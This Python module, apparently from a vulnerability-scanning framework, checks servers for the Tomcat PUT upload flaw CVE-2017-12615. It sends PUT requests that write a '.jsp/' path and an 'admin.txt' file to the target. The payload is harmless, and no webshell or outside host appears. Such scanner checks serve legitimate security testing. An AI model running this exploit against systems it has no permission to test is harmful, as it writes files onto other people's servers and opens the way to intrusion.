# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-09 13:37

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugLevel, BugType
from core.request.asynchttp import *


class Script(BaseScript):
    name = 'Get Web Putfile'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UPLOADFILE
        # 编号
        self.bug_number = 'CVE-2017-12615 / common put'
        # 来源
        self.bug_refer = 'https://blog.csdn.net/zy15667076526/article/details/109958388'
        # 特定路径判断
        self.detect_path_list = ['/111111111111.jsp/', '/admin.txt']
        # exec
        self.exec_path_list = []
        # 相关信息
        self.info = ''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.detect_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = '111111111111111'
                async with session.put(url=url, data=data, timeout=self.req_timeout, verify_ssl=False) as response:
                    if response is not None and (response.status == 204 or response.status == 201):
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                        return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}

if __name__ == '__main__':
    pass